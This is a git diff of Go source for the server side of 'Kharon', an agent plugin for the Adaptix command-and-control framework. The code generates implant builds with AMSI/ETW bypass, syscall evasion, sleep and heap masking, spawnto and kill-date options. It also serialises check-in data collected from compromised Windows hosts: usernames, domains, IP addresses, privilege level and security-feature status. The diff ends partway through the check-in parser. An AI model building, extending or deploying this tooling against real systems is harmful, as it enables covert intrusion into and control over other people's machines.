@@ -12,6 +12,8 @@ import (
 	"path/filepath"
 	"sort"
 	"strconv"
+
+	// "unsafe"
 	"time"
 	"unicode/utf16"
 
@@ -22,7 +24,7 @@ import (
 
 	"github.com/google/uuid"
 
-	adaptix "github.com/Adaptix-Framework/axc2"
+	ax "github.com/Adaptix-Framework/axc2"
 )
 
 type KharonConfig struct {
@@ -33,20 +35,20 @@ type KharonConfig struct {
 	computer string
 	netbios  string
 	pid      int
-	tid 	 int
+	tid      int
 	imgPath  string
 
-	acp      int
-	oemcp    int
+	acp   int
+	oemcp int
 
 	injectTech int
 	stompMod   string
 	allocation int
 	writing    int
 
-	syscall    int
-	bookProxy  bool
-	amsietwbp  int
+	syscall   int
+	bookProxy bool
+	amsietwbp int
 
 	killdateEbl   bool
 	killdateExit  bool
@@ -70,7 +72,7 @@ func bytesToHexString(data []byte) string {
 	if len(data) == 0 {
 		return "{ }"
 	}
-	
+
 	var result string
 	result = "{ "
 	for i, b := range data {
@@ -120,6 +122,7 @@ type KharonData struct {
 		username  string
 		computer  string
 		domain    string
+		netbios   string
 		ipaddress string
 
 		os_arch byte
@@ -145,41 +148,48 @@ type KharonData struct {
 	}
 
 	session struct {
-		agent_id 	string
-		
-		sleep_time	string
-		jitter		string
+		agent_id_str string
+		agent_id_int uint32
+
+		sleep_time uint32
+		jitter     uint32
 
 		heap_handle uint64
 
 		elevated bool
 
 		process_arch uint32
-		
-		img_path 	string
-		img_name 	string
-		cmd_line    string
-		process_id	uint32
-		thread_id   uint32
-		parent_id   uint32
+
+		img_path   string
+		img_name   string
+		cmd_line   string
+		process_id uint32
+		thread_id  uint32
+		parent_id  uint32
+
+		acp   uint32
+		oemcp uint32
 
 		base struct {
-			start uint64
-			end   uint64
+			start string
+			end   string
+
+			size uint32
 		}
 	}
 
 	killdate struct {
 		enabled bool
-		date    string
-		exit    string
+		exit    bool // true: exit process | false: exit thread
 		selfdel bool
+
+		date time.Time
 	}
 
 	worktime struct {
 		enabled bool
 		start   string
-		end     string	
+		end     string
 	}
 
 	guardrails struct {
@@ -190,31 +200,24 @@ type KharonData struct {
 	}
 
 	mask struct {
-		heap 	bool
-		beacon	uint32
+		heap   bool
+		beacon uint32
 
-		ntcontinue uint64
-	}
-
-	injection struct {
-		technique    uint32
-		stomp_module string
-
-		writing 	 uint32
-		allocation   uint32
+		jmpgadget  string
+		ntcontinue string
 	}
 
 	evasion struct {
-		bof_proxy 		bool
-		syscall     	uint32
-		amsi_etw_bypass uint32
+		bof_proxy       bool
+		syscall         uint32
+		amsi_etw_bypass int32
 	}
 
 	ps struct {
 		parent_id  uint32
 		block_dlls bool
 		spawnto    string
-		fork_pipe  uint32
+		fork_pipe  string
 	}
 }
 
@@ -224,10 +227,8 @@ type AgentConfig struct {
 	Sleep  string `json:"sleep"`
 	Jitter int    `json:"jitter"`
 
-	KilldateCheck   bool   `json:"killdate_check"`
-	KilldateDate    string `json:"killdate_date"`
-	KilldateExit    string `json:"killdate_exit"`
-	KilldateSelfDel bool   `json:"killdate_selfdel"`
+	KilldateCheck bool   `json:"killdate_check"`
+	KilldateDate  string `json:"killdate_date"`
 
 	ForkPipe    string `json:"fork_pipename"`
 	Spawnto     string `json:"spawnto"`
@@ -236,8 +237,6 @@ type AgentConfig struct {
 	MaskSleep   string `json:"mask_sleep"`
 	BofApiProxy bool   `json:"bof_api_proxy"`
 	Syscall     string `json:"syscall"`
-	InjectId    string `json:"inject_id"`
-	stompMod    string `json:"stomp_module"`
 
 	GuardIpAddress  string `json:"guardrails_ip"`
 	GuardHostName   string `json:"guardrails_hostname"`
@@ -247,14 +246,16 @@ type AgentConfig struct {
 	WorkingTimeCheck bool   `json:"workingtime_check"`
 	WorkingTimeEnd   string `json:"workingtime_end"`
 	WorkingTimeStart string `json:"workingtime_start"`
+
+	kharon_data []byte
 }
 
 type OutputConfig struct {
-	Mask      bool   
-	Header    string 
-	Format    string 
-	Parameter string 
-	Body      string 
+	Mask      bool
+	Header    string
+	Format    string
+	Parameter string
+	Body      string
 
 	Append  string
 	Prepend string
@@ -267,48 +268,47 @@ type URIConfig struct {
 }
 
 type ServerError struct {
-	Status   int   
+	Status   int
 	Response string
 }
 
 type HTTPMethod struct {
-	ServerHeaders map[string]string    
-	EmptyResponse []byte               
-	ClientHeaders map[string]string    
-	URI           map[string]URIConfig 
+	ServerHeaders map[string]string
+	EmptyResponse []byte
+	ClientHeaders map[string]string
+	URI           map[string]URIConfig
 }
 
 type Callback struct {
-	Hosts      	  []string 		
-	Host      	  string 	
-	UserAgent 	  string      	
-	ServerError   *ServerError 
-	Get       	  *HTTPMethod 
-	Post          *HTTPMethod 
+	Hosts       []string
+	Host        string
+	UserAgent   string
+	ServerError *ServerError
+	Get         *HTTPMethod
+	Post        *HTTPMethod
 }
 
 type ServerRequest struct {
-	Headers		string
-	Body    	[]byte
-	EmptyResp	[]byte
-	Payload     []byte
+	Headers   string
+	Body      []byte
+	EmptyResp []byte
+	Payload   []byte
 }
 
 type ClientRequest struct {
-	Uri  		string
-	HttpMethod	string
-	Address     string
-	Params      map[string][]string
-	UserAgent   string
-	Body 		[]byte
-	Payload     []byte
+	Uri        string
+	HttpMethod string
+	Address    string
+	Params     map[string][]string
+	UserAgent  string
+	Body       []byte
+	Payload    []byte
 
-	Config      Callback
+	Config Callback
 
-	UriConfig       *URIConfig
-	HttpMethodCfg	*HTTPMethod
+	UriConfig     *URIConfig
+	HttpMethodCfg *HTTPMethod
 }
-
 
 func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
 	fmt.Println("=== AgentGenerateBuild START ===")
@@ -494,8 +494,6 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 
 	fmt.Printf("DEBUG: Spawnto (for make): %s\n", spawnto)
 
-	stompModule := cfg.stompMod
-
 	// Build make variables
 	makeVars := []string{
 		fmt.Sprintf("WEB_SECURE_ENABLED=%d", boolToInt(sslEnabled)),
@@ -518,12 +516,9 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		fmt.Sprintf("KH_KILLDATE_DAY=%d", killdateDay),
 		fmt.Sprintf("KH_KILLDATE_MONTH=%d", killdateMonth),
 		fmt.Sprintf("KH_KILLDATE_YEAR=%d", killdateYear),
-		fmt.Sprintf("KH_KILLDATE_EXIT_PROCESS=%d", boolToInt(cfg.KilldateExit == "Process")),
-		fmt.Sprintf("KH_KILLDATE_SELFDEL=%d", boolToInt(cfg.KilldateSelfDel)),
 
 		fmt.Sprintf("KH_FORK_PIPENAME=%s", forkPipeC),
 		fmt.Sprintf("KH_SPAWNTO_X64=%s", spawnto),
-		fmt.Sprintf("KH_STOMP_MODULE=%s", stompModule),
 
 		fmt.Sprintf("KH_BOF_HOOK_ENABLED=%d", boolToInt(cfg.BofApiProxy)),
 
@@ -572,17 +567,6 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		makeVars = append(makeVars, "KH_AMSI_ETW_BYPASS=0x100")
 	default:
 		makeVars = append(makeVars, "KH_AMSI_ETW_BYPASS=0x000")
-	}
-
-	// Injection method
-	fmt.Printf("DEBUG: Injection method: %s\n", cfg.InjectId)
-	switch cfg.InjectId {
-	case "Standard":
-		makeVars = append(makeVars, "KH_INJECTION_ID=0x10")
-	case "Stomping":
-		makeVars = append(makeVars, "KH_INJECTION_ID=0x20")
-	default:
-		makeVars = append(makeVars, "KH_INJECTION_ID=0x10")
 	}
 
 	// Heap obfuscation
@@ -760,17 +744,18 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	}
 
 	// Set output filename and final binary
-	if cfg.Format == "Exe" {
+	switch cfg.Format {
+	case "Exe":
 		outFileName = "Kharon.x64.exe"
-	} else if cfg.Format == "Dll" {
+	case "Dll":
 		outFileName = "Kharon.x64.dll"
-	} else if cfg.Format == "Svc" {
+	case "Svc":
 		outFileName = "Kharon.x64.svc.exe"
-	} else if cfg.Format == "Bin" {
+	case "Bin":
 		outFileName = "Kharon.x64.bin"
 		finalBin = bin
 		fmt.Println("DEBUG: Using raw binary format")
-	} else {
+	default:
 		outFileName = fmt.Sprintf("Kharon.%s.bin", target)
 		finalBin = bin
 		fmt.Printf("DEBUG: Using default format with target: %s\n", target)
@@ -784,21 +769,631 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	return finalBin, outFileName, nil
 }
 
-func CreateAgent(initialData []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
-	var agent adaptix.AgentData
+func writeString(buf *bytes.Buffer, s string) error {
+	data := []byte(s)
+	if err := binary.Write(buf, binary.LittleEndian, uint32(len(data))); err != nil {
+		return err
+	}
+	if err := binary.Write(buf, binary.LittleEndian, data); err != nil {
+		return err
+	}
+	return nil
+}
+
+func readString(buf *bytes.Reader) (string, error) {
+	var len uint32
+	if err := binary.Read(buf, binary.LittleEndian, &len); err != nil {
+		return "", err
+	}
+	data := make([]byte, len)
+	if err := binary.Read(buf, binary.LittleEndian, &data); err != nil {
+		return "", err
+	}
+	return string(data), nil
+}
+
+func writeBool(buf *bytes.Buffer, b bool) error {
+	val := uint8(0)
+	if b {
+		val = 1
+	}
+	return binary.Write(buf, binary.LittleEndian, val)
+}
+
+func readBool(buf *bytes.Reader) (bool, error) {
+	var val uint8
+	err := binary.Read(buf, binary.LittleEndian, &val)
+	return val != 0, err
+}
+
+func writeTime(buf *bytes.Buffer, t time.Time) error {
+	return binary.Write(buf, binary.LittleEndian, t.Unix())
+}
+
+func readTime(buf *bytes.Reader) (time.Time, error) {
+	var timestamp int64
+	err := binary.Read(buf, binary.LittleEndian, &timestamp)
+	return time.Unix(timestamp, 0).UTC(), err
+}
+
+func (k *KharonData) Marshal() ([]byte, error) {
+	var buf bytes.Buffer
+
+	// Machine
+	if err := writeString(&buf, k.machine.username); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.machine.computer); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.machine.domain); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.machine.netbios); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.machine.ipaddress); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.os_arch); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.processor_numbers); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.machine.processor_name); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.ram_used); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.ram_total); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.ram_aval); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.ram_perct); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.os_minor); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.os_major); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.os_build); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.allocation_gran); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.page_size); err != nil {
+		return nil, err
+	}
+	if err := writeBool(&buf, k.machine.cfg_enabled); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.dse_status); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.machine.vbs_hvci); err != nil {
+		return nil, err
+	}
+
+	// Session
+	if err := writeString(&buf, k.session.agent_id_str); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.session.agent_id_int); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.session.sleep_time); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.session.jitter); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.session.heap_handle); err != nil {
+		return nil, err
+	}
+	if err := writeBool(&buf, k.session.elevated); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.session.process_arch); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.session.img_path); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.session.img_name); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.session.cmd_line); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.session.process_id); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.session.thread_id); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.session.parent_id); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.session.acp); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.session.oemcp); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.session.base.start); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.session.base.end); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.session.base.size); err != nil {
+		return nil, err
+	}
+
+	// Killdate
+	if err := writeBool(&buf, k.killdate.enabled); err != nil {
+		return nil, err
+	}
+	if err := writeBool(&buf, k.killdate.exit); err != nil {
+		return nil, err
+	}
+	if err := writeBool(&buf, k.killdate.selfdel); err != nil {
+		return nil, err
+	}
+	if err := writeTime(&buf, k.killdate.date); err != nil {
+		return nil, err
+	}
+
+	// Worktime
+	if err := writeBool(&buf, k.worktime.enabled); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.worktime.start); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.worktime.end); err != nil {
+		return nil, err
+	}
+
+	// Guardrails
+	if err := writeString(&buf, k.guardrails.ipaddress); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.guardrails.hostname); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.guardrails.username); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.guardrails.domain); err != nil {
+		return nil, err
+	}
+
+	// Mask
+	if err := writeBool(&buf, k.mask.heap); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.mask.beacon); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.mask.jmpgadget); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.mask.ntcontinue); err != nil {
+		return nil, err
+	}
+
+	// Evasion
+	if err := writeBool(&buf, k.evasion.bof_proxy); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.evasion.syscall); err != nil {
+		return nil, err
+	}
+	if err := binary.Write(&buf, binary.LittleEndian, k.evasion.amsi_etw_bypass); err != nil {
+		return nil, err
+	}
+
+	// PS
+	if err := binary.Write(&buf, binary.LittleEndian, k.ps.parent_id); err != nil {
+		return nil, err
+	}
+	if err := writeBool(&buf, k.ps.block_dlls); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.ps.spawnto); err != nil {
+		return nil, err
+	}
+	if err := writeString(&buf, k.ps.fork_pipe); err != nil {
+		return nil, err
+	}
+
+	return buf.Bytes(), nil
+}
+
+func (k *KharonData) Unmarshal(data []byte) error {
+	buf := bytes.NewReader(data)
+
+	// Machine
+	var err error
+	k.machine.username, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read machine.username: %w", err)
+	}
+
+	k.machine.computer, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read machine.computer: %w", err)
+	}
+
+	k.machine.domain, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read machine.domain: %w", err)
+	}
+
+	k.machine.netbios, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read machine.netbios: %w", err)
+	}
+
+	k.machine.ipaddress, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read machine.ipaddress: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.os_arch); err != nil {
+		return fmt.Errorf("failed to read machine.os_arch: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.processor_numbers); err != nil {
+		return fmt.Errorf("failed to read machine.processor_numbers: %w", err)
+	}
+
+	k.machine.processor_name, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read machine.processor_name: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.ram_used); err != nil {
+		return fmt.Errorf("failed to read machine.ram_used: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.ram_total); err != nil {
+		return fmt.Errorf("failed to read machine.ram_total: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.ram_aval); err != nil {
+		return fmt.Errorf("failed to read machine.ram_aval: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.ram_perct); err != nil {
+		return fmt.Errorf("failed to read machine.ram_perct: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.os_minor); err != nil {
+		return fmt.Errorf("failed to read machine.os_minor: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.os_major); err != nil {
+		return fmt.Errorf("failed to read machine.os_major: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.os_build); err != nil {
+		return fmt.Errorf("failed to read machine.os_build: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.allocation_gran); err != nil {
+		return fmt.Errorf("failed to read machine.allocation_gran: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.page_size); err != nil {
+		return fmt.Errorf("failed to read machine.page_size: %w", err)
+	}
+
+	k.machine.cfg_enabled, err = readBool(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read machine.cfg_enabled: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.dse_status); err != nil {
+		return fmt.Errorf("failed to read machine.dse_status: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.machine.vbs_hvci); err != nil {
+		return fmt.Errorf("failed to read machine.vbs_hvci: %w", err)
+	}
+
+	// Session
+	k.session.agent_id_str, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read session.agent_id_str: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.session.agent_id_int); err != nil {
+		return fmt.Errorf("failed to read session.agent_id_int: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.session.sleep_time); err != nil {
+		return fmt.Errorf("failed to read session.sleep_time: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.session.jitter); err != nil {
+		return fmt.Errorf("failed to read session.jitter: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.session.heap_handle); err != nil {
+		return fmt.Errorf("failed to read session.heap_handle: %w", err)
+	}
+
+	k.session.elevated, err = readBool(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read session.elevated: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.session.process_arch); err != nil {
+		return fmt.Errorf("failed to read session.process_arch: %w", err)
+	}
+
+	k.session.img_path, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read session.img_path: %w", err)
+	}
+
+	k.session.img_name, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read session.img_name: %w", err)
+	}
+
+	k.session.cmd_line, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read session.cmd_line: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.session.process_id); err != nil {
+		return fmt.Errorf("failed to read session.process_id: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.session.thread_id); err != nil {
+		return fmt.Errorf("failed to read session.thread_id: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.session.parent_id); err != nil {
+		return fmt.Errorf("failed to read session.parent_id: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.session.acp); err != nil {
+		return fmt.Errorf("failed to read session.acp: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.session.oemcp); err != nil {
+		return fmt.Errorf("failed to read session.oemcp: %w", err)
+	}
+
+	k.session.base.start, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read session.base.start: %w", err)
+	}
+
+	k.session.base.end, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read session.base.end: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.session.base.size); err != nil {
+		return fmt.Errorf("failed to read session.base.size: %w", err)
+	}
+
+	// Killdate
+	k.killdate.enabled, err = readBool(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read killdate.enabled: %w", err)
+	}
+
+	k.killdate.exit, err = readBool(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read killdate.exit: %w", err)
+	}
+
+	k.killdate.selfdel, err = readBool(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read killdate.selfdel: %w", err)
+	}
+
+	k.killdate.date, err = readTime(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read killdate.date: %w", err)
+	}
+
+	// Worktime
+	k.worktime.enabled, err = readBool(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read worktime.enabled: %w", err)
+	}
+
+	k.worktime.start, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read worktime.start: %w", err)
+	}
+
+	k.worktime.end, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read worktime.end: %w", err)
+	}
+
+	// Guardrails
+	k.guardrails.ipaddress, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read guardrails.ipaddress: %w", err)
+	}
+
+	k.guardrails.hostname, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read guardrails.hostname: %w", err)
+	}
+
+	k.guardrails.username, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read guardrails.username: %w", err)
+	}
+
+	k.guardrails.domain, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read guardrails.domain: %w", err)
+	}
+
+	// Mask
+	k.mask.heap, err = readBool(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read mask.heap: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.mask.beacon); err != nil {
+		return fmt.Errorf("failed to read mask.beacon: %w", err)
+	}
+
+	k.mask.jmpgadget, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read mask.jmpgadget: %w", err)
+	}
+
+	k.mask.ntcontinue, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read mask.ntcontinue: %w", err)
+	}
+
+	// Evasion
+	k.evasion.bof_proxy, err = readBool(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read evasion.bof_proxy: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.evasion.syscall); err != nil {
+		return fmt.Errorf("failed to read evasion.syscall: %w", err)
+	}
+
+	if err := binary.Read(buf, binary.LittleEndian, &k.evasion.amsi_etw_bypass); err != nil {
+		return fmt.Errorf("failed to read evasion.amsi_etw_bypass: %w", err)
+	}
+
+	// PS
+	if err := binary.Read(buf, binary.LittleEndian, &k.ps.parent_id); err != nil {
+		return fmt.Errorf("failed to read ps.parent_id: %w", err)
+	}
+
+	k.ps.block_dlls, err = readBool(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read ps.block_dlls: %w", err)
+	}
+
+	k.ps.spawnto, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read ps.spawnto: %w", err)
+	}
+
+	k.ps.fork_pipe, err = readString(buf)
+	if err != nil {
+		return fmt.Errorf("failed to read ps.fork_pipe: %w", err)
+	}
+
+	return nil
+}
+
+func GetWindowsVersionName(major uint32, minor uint32, build uint32) string {
+    if major == 10 && minor == 0 {
+        if build >= 22000 {
+            return "Windows 11"
+        }
+        return "Windows 10"
+    }
+
+    // Windows 8.1
+    if major == 6 && minor == 3 {
+        return "Windows 8.1"
+    }
+
+    // Windows 8
+    if major == 6 && minor == 2 {
+        return "Windows 8"
+    }
+
+    // Windows 7
+    if major == 6 && minor == 1 {
+        return "Windows 7"
+    }
+
+    // Windows Vista
+    if major == 6 && minor == 0 {
+        return "Windows Vista"
+    }
+
+    return fmt.Sprintf("Windows %d.%d (Build %d)", major, minor, build)
+}
+
+func GetDetailedWindowsVersion(major uint32, minor uint32, build uint32) map[string]interface{} {
+    versionInfo := map[string]interface{}{
+        "version_number": fmt.Sprintf("%d.%d", major, minor),
+        "build":          build,
+        "name":           "",
+        "release_name":   "",
+    }
+
+    if major == 10 && minor == 0 {
+        versionInfo["name"] = "Windows 10/11"
+
+        if build >= 22000 {
+            versionInfo["name"] = "Windows 11"
+            switch {
+            case build >= 22621:
+                versionInfo["release_name"] = "23H2"
+            case build >= 22000:
+                versionInfo["release_name"] = "21H2"
+            }
+        } else {
+            versionInfo["name"] = "Windows 10"
+            switch {
+            case build >= 19045:
+                versionInfo["release_name"] = "22H2"
+            case build >= 19044:
+                versionInfo["release_name"] = "22H2"
+            case build >= 19043:
+                versionInfo["release_name"] = "21H2"
+            case build >= 19041:
+                versionInfo["release_name"] = "21H1"
+            }
+        }
+    } else if major == 6 && minor == 3 {
+        versionInfo["name"] = "Windows 8.1"
+        versionInfo["release_name"] = "8.1"
+    } else if major == 6 && minor == 2 {
+        versionInfo["name"] = "Windows 8"
+        versionInfo["release_name"] = "8"
+    } else if major == 6 && minor == 1 {
+        versionInfo["name"] = "Windows 7"
+        versionInfo["release_name"] = "7"
+    } else if major == 6 && minor == 0 {
+        versionInfo["name"] = "Windows Vista"
+        versionInfo["release_name"] = "Vista"
+    }
+
+    return versionInfo
+}
+
+func CreateAgent(initialData []byte) (ax.AgentData, ax.ExtenderAgent, error) {
+	var (
+		agent ax.AgentData
+		khcfg KharonData
+	)
 
 	fmt.Println("=== DEBUG RAW DATA ===")
 	fmt.Printf("Total bytes received: %d\n", len(initialData))
 	fmt.Printf("Hex dump:\n%s", hex.Dump(initialData))
-	fmt.Printf("Raw bytes: %x\n", initialData)
-	fmt.Printf("As string (printable): ")
-	for _, b := range initialData {
-		if b >= 32 && b <= 126 {
-			fmt.Printf("%c", b)
-		} else {
-			fmt.Printf(".")
-		}
-	}
 	fmt.Printf("\n")
 	fmt.Println("======================")
 
@@ -810,10 +1405,12 @@ func CreateAgent(initialData []byte) (adaptix.AgentData, adaptix.ExtenderAgent, 
 		return agent, ModuleObject.ext, errors.New("error agent checkin data")
 	}
 
-	randomUUID := packer.ParsePad(36)
+	khcfg.session.agent_id_str = string(packer.ParsePad(36))
 	agentId := fmt.Sprintf("%08x", rand.Uint32())
 	fmt.Printf("Agent ID: %s\n", agentId)
-	fmt.Printf("Agent Random UUID: %s\n", randomUUID)
+	fmt.Printf("Agent Random UUID: %s\n", khcfg.session.agent_id_str)
+
+	khcfg.session.agent_id_str = agentId
 
 	// if false == packer.CheckPacker([]string{"byte", "array", "array", "array", "int", "array", "int", "int", "int", "int", "int", "int",
 	// 	"int", "int", "int", "int", "word", "word", "word", "array", "int", "int", "int", "int", "int", "int", "long",
@@ -823,163 +1420,201 @@ func CreateAgent(initialData []byte) (adaptix.AgentData, adaptix.ExtenderAgent, 
 	// 	return agent, errors.New("error agent data")
 	// }
 
-	osArch := packer.ParseInt8()
-	fmt.Printf("OS Arch: %v\n", osArch)
+	khcfg.machine.os_arch = packer.ParseInt8()
+	fmt.Printf("OS Arch: %v\n", khcfg.machine.os_arch)
 
-	usernameBytes := packer.ParseBytes()
-	fmt.Printf("Username Bytes: %v\n", usernameBytes)
+	khcfg.machine.username = string(packer.ParseBytes())
+	fmt.Printf("Username: %v\n", khcfg.machine.username)
 
-	computerBytes := packer.ParseString()
-	fmt.Printf("Computer Bytes: %s\n", computerBytes)
+	khcfg.machine.computer = packer.ParseString()
+	fmt.Printf("Computer: %s\n", khcfg.machine.computer)
 
-	domainBytes := packer.ParseString()
-	fmt.Printf("domain Bytes: %s\n", domainBytes)
+	khcfg.machine.domain = packer.ParseString()
+	fmt.Printf("Domain: %s\n", khcfg.machine.domain)
 
-	netbios := packer.ParseString()
-	fmt.Printf("NETBIOS: %s\n", netbios)
+	khcfg.machine.netbios = packer.ParseString()
+	fmt.Printf("NETBIOS: %s\n", khcfg.machine.netbios)
 
-	pid := packer.ParseInt32()
-	fmt.Printf("PID: %v\n", pid)
+	khcfg.session.process_id = uint32(packer.ParseInt32())
+	fmt.Printf("PID: %v\n", khcfg.session.process_id)
 
-	imagePathBytes := packer.ParseString()
-	fmt.Printf("Image Path Bytes: %s\n", imagePathBytes)
+	khcfg.session.img_path = packer.ParseString()
+	fmt.Printf("Image Path: %s\n", khcfg.session.img_path)
 
-	acp := int(packer.ParseInt32())
-	fmt.Printf("ACP: %v\n", acp)
+	khcfg.session.acp = uint32(packer.ParseInt32())
+	fmt.Printf("ACP: %v\n", khcfg.session.acp)
 
-	oemcp := int(packer.ParseInt32())
-	fmt.Printf("OEMCP: %v\n", oemcp)
+	khcfg.session.oemcp = uint32(packer.ParseInt32())
+	fmt.Printf("OEMCP: %v\n", khcfg.session.oemcp)
 
-	_ = int(packer.ParseInt32())
